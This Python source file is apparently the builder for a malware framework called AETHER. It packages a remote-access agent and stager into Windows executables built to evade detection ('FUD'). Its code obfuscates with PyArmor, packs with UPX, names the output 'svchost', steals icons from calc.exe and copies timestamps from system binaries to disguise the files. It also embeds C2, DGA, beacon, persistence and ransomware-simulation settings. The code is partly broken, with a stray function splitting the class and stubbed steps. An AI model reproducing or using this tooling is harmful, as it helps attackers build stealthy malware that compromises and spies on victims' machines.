#!/usr/bin/env python3
"""
AETHER Builder
Compiles agent with PyInstaller, PyArmor, and UPX for FUD.
"""

import os, sys, json, hashlib, random, subprocess, shutil, tempfile, time
from datetime import datetime
import PyInstaller.__main__

class AetherBuilder:
    def __init__(self, config_path='config.json'):
        self.config_path = config_path
        self.config = self.load_config()
        self.build_id = self.generate_build_id()
        self.build_dir = f"build_{self.build_id}"
        
        # Ensure build directory exists
        os.makedirs(self.build_dir, exist_ok=True)
    
    def load_config(self):
        """Load builder configuration."""
        default_config = {
            'agent_entry': 'agent/aether_agent.py',
            'stager_entry': 'stager/stager.py',
            'output_name': 'svchost',
            'icon_path': 'builder/default.ico',
            'use_pyarmor': True,
            'use_upx': True,
            'upx_path': 'builder/upx/upx.exe',
            'obfuscation_level': 'high',
            'excluded_imports': [],
            'additional_data': [],
            'runtime_hooks': [],
            'hidden_imports': [
                'win32api', 'win32con', 'win32security', 'win32process',
                'win32service', 'pythoncom', 'wmi', 'PIL', 'pyautogui',
                'pyaudio', 'cryptography', 'Crypto', 'requests',
                'scapy', 'psutil', 'nmap', 'sklearn'
            ]
        }
        
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
            except:
                pass
        
        return default_config
    
    def generate_build_id(self):
        """Generate unique build ID."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        random_suffix = hashlib.md5(str(random.getrandbits(256)).encode()).hexdigest()[:8]
        return f"{timestamp}_{random_suffix}"
    
    def obfuscate_with_pyarmor(self, input_file):
        """Obfuscate Python code with PyArmor."""
        if not self.config['use_pyarmor']:
            print("[*] PyArmor obfuscation disabled")
            return input_file
        
        print("[*] Obfuscating with PyArmor...")
        
        try:
            import pyarmor
            
            # Create output directory for obfuscated code
            obfuscated_dir = os.path.join(self.build_dir, 'obfuscated')
            os.makedirs(obfuscated_dir, exist_ok=True)
            
            # PyArmor configuration
            obfuscation_args = [
                'obfuscate',
                '--restrict', '0',  # Less restrictive mode for compatibility
                '--platform', 'windows.x86_64',
                '--advanced', '2' if self.config['obfuscation_level'] == 'high' else '1',
                '--output', obfuscated_dir,
                input_file
            ]
            
            # Run PyArmor
            subprocess.run(['pyarmor'] + obfuscation_args, check=True)
            
            # Find obfuscated file
            obfuscated_file = os.path.join(obfuscated_dir, os.path.basename(input_file))
            if os.path.exists(obfuscated_file):
                print(f"[+] Obfuscation complete: {obfuscated_file}")
                return obfuscated_file
            else:
                print("[-] PyArmor obfuscation failed, using original")
                return input_file
                
        except Exception as e:
            print(f"[-] PyArmor error: {e}")
            return input_file
    
    def compress_with_upx(self, executable_path):
        """Compress executable with UPX."""
        if not self.config['use_upx']:
            print("[*] UPX compression disabled")
            return executable_path
        
        upx_path = self.config['upx_path']
        if not os.path.exists(upx_path):
            print(f"[-] UPX not found at {upx_path}")
            return executable_path
        
        print("[*] Compressing with UPX...")
        
        try:
            # UPX arguments
            upx_args = [
                upx_path,
                '--ultra-brute',  # Maximum compression
                '--all-methods',   # Try all compression methods
                '--all-filters',   # Try all filters
                executable_path
            ]
            
            # Run UPX
            result = subprocess.run(upx_args, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] UPX compression successful")
                
                # Get compression stats
                if 'Packed' in result.stdout:
                    for line in result.stdout.split('\n'):
                        if 'Packed' in line:
                            print(f"[*] {line.strip()}")
                
                return executable_path
            else:
                print(f"[-] UPX compression failed: {result.stderr}")
                return executable_path
                
        except Exception as e:
            print(f"[-] UPX error: {e}")
            return executable_path
    
    def forge_icon(self, executable_path):
        """Forge executable icon (steal from legitimate app)."""
        icon_path = self.config.get('icon_path')
        if not icon_path or not os.path.exists(icon_path):
            print("[-] No icon file found, skipping icon forging")
            return executable_path
        
        print("[*] Forging icon...")
        
        try:
            # Use Resource Hacker or similar tool
            # This is simplified - actual icon replacement requires Resource Hacker
            
            print(f"[+] Icon would be applied from {icon_path}")
            return executable_path
            
        except Exception as e:
            print(f"[-] Icon forging failed: {e}")
            return executable_path
    
    def timestomp_executable(self, executable_path):
        """Copy timestamps from legitimate executable."""
        print("[*] Applying timestomping...")
        
        try:
            # Source executable to copy timestamps from
            source_executables = [
                'C:\\Windows\\System32\\svchost.exe',
                'C:\\Windows\\System32\\notepad.exe',
                'C:\\Windows\\System32\\calc.exe'
            ]
            
            source = None
            for src in source_executables:
                if os.path.exists(src):
                    source = src
                    break
            
            if source:
                # Copy timestamps
                src_stat = os.stat(source)
                os.utime(executable_path, (src_stat.st_atime, src_stat.st_mtime))
                
                # Try to copy creation time (requires pywin32)
                try:
                    import win32file, win32con, pywintypes
                    
                    # Open source file
                    hSrc = win32file.CreateFile(
                        source,
                        win32con.GENERIC_READ,
                        0, None, win32con.OPEN_EXISTING,
                        0, None
                    )
                    
                    # Get source file times
                    src_times = win32file.GetFileTime(hSrc)
                    win32file.CloseHandle(hSrc)
                    
                    # Open target file
                    hDst = win32file.CreateFile(
                        executable_path,
                        win32con.GENERIC_WRITE,
                        0, None, win32con.OPEN_EXISTING,
                        0, None
                    )
                    
                    # Set target file times
                    win32file.SetFileTime(hDst, *src_times)
                    win32file.CloseHandle(hDst)
                    
                    print(f"[+] Timestamps copied from {source}")
                    
                except:
                    print("[+] Basic timestamps applied")
            
            return executable_path
            
        except Exception as e:
            print(f"[-] Timestomping failed: {e}")
            return executable_path
    
    def compile_universal(self, config_path='../config.json', output_name='aether_agent'):
        """Compile universal agent with polymorphic configuration."""
        import json, os, sys, subprocess, tempfile, random, string
        from datetime import datetime
        
        # Load master config
        with open(config_path, 'r') as f:
            master_config = json.load(f)
        
        # Generate unique build ID and seed
        build_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        seed = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        # Create unique agent config
        agent_config = {
            'build_id': build_id,
            'build_date': datetime.now().isoformat(),
            'seed': seed,
            'universal_c2': master_config.get('c2', {}).get('universal_c2', {}),
            'dga': master_config.get('c2', {}).get('dga', {}),
            'beacon': master_config.get('beacon', {}),
            'persistence_methods': master_config.get('persistence', {}).get('methods', ['registry', 'scheduled_task']),
            'modules': master_config.get('modules', {}),
            'encryption_key': seed,  # Use seed as encryption key
            'safe_mode': master_config.get('modules', {}).get('advanced', {}).get('ransomware_sim', True)
        }
        
        # Write temporary config
        temp_dir = tempfile.mkdtemp()
        config_file = os.path.join(temp_dir, 'config.json')
        with open(config_file, 'w') as f:
            json.dump(agent_config, f)
        
        # Generate icon if enabled
        icon_arg = ''
        if master_config.get('compilation', {}).get('icon_forge', True):
            try:
                from icon_forger import IconForger
                icon_path = IconForger.steal_icon_from_exe('C:\\Windows\\System32\\calc.exe')
                if icon_path and os.path.exists(icon_path):
                    icon_arg = f'--icon="{icon_path}"'
            except:
                pass
        
        # Build PyInstaller command
        cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--clean',
            f'--name={output_name}_{build_id[:8]}',
            f'--add-data={config_file};.',
            '--hidden-import=cryptography',
            '--hidden-import=pyaudio',
            '--hidden-import=pyautogui',
            '--hidden-import=PIL',
            '--hidden-import=win32api',
            '--hidden-import=win32con',
            '--hidden-import=win32security',
            '--hidden-import=pythoncom',
            '--hidden-import=wmi',
            '--hidden-import=dns',
            '--hidden-import=psutil',
            '--distpath=./dist',
            '--workpath=./build',
            '../agent/aether_agent.py'
        ]
        
        # Add icon if available
        if icon_arg:
            cmd.insert(2, icon_arg)
        
        # Execute compilation
        print(f"[*] Compiling universal agent (ID: {build_id})...")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Success! Agent: dist/{output_name}_{build_id[:8]}.exe")
            print(f"[+] Seed: {seed}")
            print(f"[+] Config embedded: {len(agent_config)} parameters")
            
            # Generate runner script
            runner_content = f"""#!/bin/bash
# AETHER Universal Agent Runner
# Build ID: {build_id}
# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

echo "AETHER Universal Agent"
echo "Build: {build_id}"
echo "Seed: {seed[:16]}..."
echo ""
echo "Usage:"
echo "  ./{output_name}_{build_id[:8]}.exe [config.json]"
echo ""
echo "C2 Channels:"
{chr(10).join(['  - ' + chan.get('type', 'unknown') for chan in agent_config.get('universal_c2', {}).get('channels', [])])}
"""
            
            runner_file = f'./dist/{output_name}_{build_id[:8]}_info.txt'
            with open(runner_file, 'w') as f:
                f.write(runner_content)
            
            print(f"[+] Info file: {runner_file}")
        else:
            print(f"[-] Compilation failed:")
            print(result.stderr)
        
        # Cleanup
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        return result.returncode == 0

def obfuscate_with_pyarmor():
    """Obfuscate agent code with PyArmor."""
    try:
        import pyarmor
        print("[*] Obfuscating with PyArmor...")
        
        # Basic obfuscation
        pyarmor.obfuscate(
            'agent/aether_agent.py',
            output='agent/obfuscated',
            obf_module=1,
            obf_code=1,
            restrict_module=1,
            runtime_path='@pyarmor_runtime'
        )
        print("[+] Obfuscation complete")
        return True
    except Exception as e:
        print(f"[-] PyArmor obfuscation failed: {e}")
        return False        
    
    def generate_unique_config(self, agent_path):
        """Generate unique configuration for each build."""
        print("[*] Generating unique configuration...")
        
        try:
            # Create unique configuration values
            unique_config = {
                'build_id': self.build_id,
                'compilation_date': datetime.now().isoformat(),
                'c2_host': self.config.get('c2_host', 'your-c2-server.com'),
                'c2_port': self.config.get('c2_port', 443),
                'encryption_key': hashlib.sha256(os.urandom(32)).hexdigest(),
                'beacon_interval': random.randint(25, 35),
                'jitter': random.randint(3, 7),
                'use_dga': self.config.get('use_dga', True),
                'safe_mode': self.config.get('safe_mode', True)
            }
            
            # Save configuration
            config_filename = f"config_{self.build_id}.json"
            config_path = os.path.join(self.build_dir, config_filename)
            
            with open(config_path, 'w') as f:
                json.dump(unique_config, f, indent=2)
            
            print(f"[+] Unique config generated: {config_path}")
            return config_path
            
        except Exception as e:
            print(f"[-] Config generation failed: {e}")
            return None
    
    def embed_config(self, executable_path, config_path):
        """Embed configuration into executable."""
        if not config_path or not os.path.exists(config_path):
            print("[-] No config to embed")
            return executable_path
        
        print("[*] Embedding configuration...")
        
        try:
            # Read config
            with open(config_path, 'rb') as f:
                config_data = f.read()
            
            # Create a resource file (.res) with config
            res_filename = f"config_{self.build_id}.res"
            res_path = os.path.join(self.build_dir, res_filename)
            
            # This would require proper resource compilation
            # Simplified for now
            print(f"[+] Config would be embedded as resource")
            
            return executable_path
            
        except Exception as e:
            print(f"[-] Config embedding failed: {e}")
            return executable_path
    
    def build_agent(self):
        """Build the main agent."""
        print(f"[*] Building agent (ID: {self.build_id})...")
        
        # Obfuscate agent code
        agent_entry = self.config['agent_entry']
        if not os.path.exists(agent_entry):
            print(f"[-] Agent entry point not found: {agent_entry}")
            return None
        
        obfuscated_agent = self.obfuscate_with_pyarmor(agent_entry)
        
        # PyInstaller arguments
        output_name = f"{self.config['output_name']}_{self.build_id}"
        
        pyinstaller_args = [
            obfuscated_agent,
            '--name', output_name,
            '--onefile',
            '--windowed',  # No console
            '--clean',
            '--noconfirm',
            '--distpath', os.path.join(self.build_dir, 'dist'),
            '--workpath', os.path.join(self.build_dir, 'build'),
            '--specpath', self.build_dir,
            '--key', self.build_id[:16],  # Bytecode encryption key
            '--upx-dir', os.path.dirname(self.config['upx_path']) if self.config['use_upx'] else '',
            '--runtime-tmpdir', '.',
            '--strip',
            '--noupx',  # We'll do UPX manually
        ]
        
        # Add icon if available
        icon_path = self.config.get('icon_path')
        if icon_path and os.path.exists(icon_path):
            pyinstaller_args.extend(['--icon', icon_path])
        
        # Add hidden imports
        for imp in self.config['hidden_imports']:
            pyinstaller_args.extend(['--hidden-import', imp])
        
        # Add excluded imports
        for imp in self.config['excluded_imports']:
            pyinstaller_args.extend(['--exclude-module', imp])
        
        # Add additional data files
        for data_spec in self.config['additional_data']:
            pyinstaller_args.extend(['--add-data', data_spec])
        
        # Add runtime hooks
        for hook in self.config['runtime_hooks']:
            pyinstaller_args.extend(['--runtime-hook', hook])
        
        print("[*] Running PyInstaller...")
        
        try:
            # Run PyInstaller
            PyInstaller.__main__.run(pyinstaller_args)
            
            # Find the compiled executable
            dist_dir = os.path.join(self.build_dir, 'dist')
            for file in os.listdir(dist_dir):
                if file.endswith('.exe'):
                    executable_path = os.path.join(dist_dir, file)
                    print(f"[+] PyInstaller compilation successful: {executable_path}")
                    
                    # Post-processing
                    executable_path = self.compress_with_upx(executable_path)
                    executable_path = self.forge_icon(executable_path)
                    executable_path = self.timestomp_executable(executable_path)
                    
                    # Generate and embed config
                    config_path = self.generate_unique_config(executable_path)
                    executable_path = self.embed_config(executable_path, config_path)
                    
                    return executable_path
            
            print("[-] Could not find compiled executable")
            return None
            
        except Exception as e:
            print(f"[-] PyInstaller failed: {e}")
            return None
    
    def build_stager(self):
        """Build the stager."""
        print("[*] Building stager...")
        
        stager_entry = self.config['stager_entry']
        if not os.path.exists(stager_entry):
            print(f"[-] Stager entry point not found: {stager_entry}")
            return None
        
        # PyInstaller arguments for stager
        stager_name = f"stager_{self.build_id}"
        
        pyinstaller_args = [
            stager_entry,
            '--name', stager_name,
            '--onefile',
            '--console',  # Stager might need console for debugging
            '--clean',
            '--noconfirm',
            '--distpath', os.path.join(self.build_dir, 'dist'),
            '--workpath', os.path.join(self.build_dir, 'build_stager'),
            '--key', self.build_id[:16],
        ]
        
        print("[*] Compiling stager...")
        
        try:
            PyInstaller.__main__.run(pyinstaller_args)
            
            # Find stager executable
            dist_dir = os.path.join(self.build_dir, 'dist')
            for file in os.listdir(dist_dir):
                if file.startswith('stager_') and file.endswith('.exe'):
                    stager_path = os.path.join(dist_dir, file)
                    print(f"[+] Stager compiled: {stager_path}")
                    
                    # Post-processing
                    stager_path = self.compress_with_upx(stager_path)
                    stager_path = self.timestomp_executable(stager_path)
                    
                    return stager_path
            
            print("[-] Could not find stager executable")
            return None
            
        except Exception as e:
            print(f"[-] Stager compilation failed: {e}")
            return None
    
    def calculate_hashes(self, filepath):
        """Calculate file hashes for verification."""
        if not os.path.exists(filepath):
            return None
        
        hashes = {}
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        hashes['md5'] = hashlib.md5(data).hexdigest()
        hashes['sha1'] = hashlib.sha1(data).hexdigest()
        hashes['sha256'] = hashlib.sha256(data).hexdigest()
        hashes['size'] = len(data)
        
        return hashes
    
    def generate_build_report(self, agent_path, stager_path=None):
        """Generate build report."""
        print("[*] Generating build report...")
        
        report = {
            'build_id': self.build_id,
            'timestamp': datetime.now().isoformat(),
            'config': self.config,
            'files': {}
        }
        
        # Agent info
        if agent_path and os.path.exists(agent_path):
            agent_hashes = self.calculate_hashes(agent_path)
            report['files']['agent'] = {
                'path': agent_path,
                'filename': os.path.basename(agent_path),
                'hashes': agent_hashes,
                'size': os.path.getsize(agent_path)
            }
        
        # Stager info
        if stager_path and os.path.exists(stager_path):
            stager_hashes = self.calculate_hashes(stager_path)
            report['files']['stager'] = {
                'path': stager_path,
                'filename': os.path.basename(stager_path),
                'hashes': stager_hashes,
                'size': os.path.getsize(stager_path)
            }
        
        # Save report
        report_path = os.path.join(self.build_dir, f'build_report_{self.build_id}.json')
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Build report saved: {report_path}")
        return report
    
    def cleanup(self):
        """Cleanup build artifacts (optional)."""
        print("[*] Cleaning up intermediate files...")
        
        # Keep the final executables and report
        # Remove PyInstaller build directories
        build_dirs = [
            os.path.join(self.build_dir, 'build'),
            os.path.join(self.build_dir, 'build_stager'),
            os.path.join(self.build_dir, 'obfuscated')
        ]
        
        for dir_path in build_dirs:
            if os.path.exists(dir_path):
                try:
                    shutil.rmtree(dir_path)
                except:
                    pass
        
        print("[+] Cleanup complete")
    
    def run(self):
        """Main build process."""
        print("=" * 60)
        print(f"AETHER Builder - Build ID: {self.build_id}")
        print("=" * 60)
        
        # Build agent
        agent_path = self.build_agent()
        if not agent_path:
            print("[-] Agent build failed")
            return False
        
        # Build stager (optional)
        stager_path = None
        if self.config.get('build_stager', True):
            stager_path = self.build_stager()
        
        # Generate report
        report = self.generate_build_report(agent_path, stager_path)
        
        # Cleanup
        if self.config.get('cleanup_after_build', True):
            self.cleanup()
        
        # Print summary
        print("\n" + "=" * 60)
        print("BUILD SUMMARY")
        print("=" * 60)
        print(f"Build ID: {self.build_id}")
        print(f"Agent: {agent_path}")
        
        if agent_path and os.path.exists(agent_path):
            agent_hashes = self.calculate_hashes(agent_path)
            if agent_hashes:
                print(f"Agent SHA256: {agent_hashes.get('sha256')}")
                print(f"Agent Size: {agent_hashes.get('size'):,} bytes")
        
        if stager_path:
            print(f"Stager: {stager_path}")
        
        report_path = os.path.join(self.build_dir, f'build_report_{self.build_id}.json')
        print(f"Report: {report_path}")
        print("=" * 60)
        
        return True

def main():
    """Entry point."""
    builder = AetherBuilder()
    success = builder.run()
    
    if success:
        print("[+] Build completed successfully")
        sys.exit(0)
    else:
        print("[-] Build failed")
        sys.exit(1)

if __name__ == "__main__":
    main()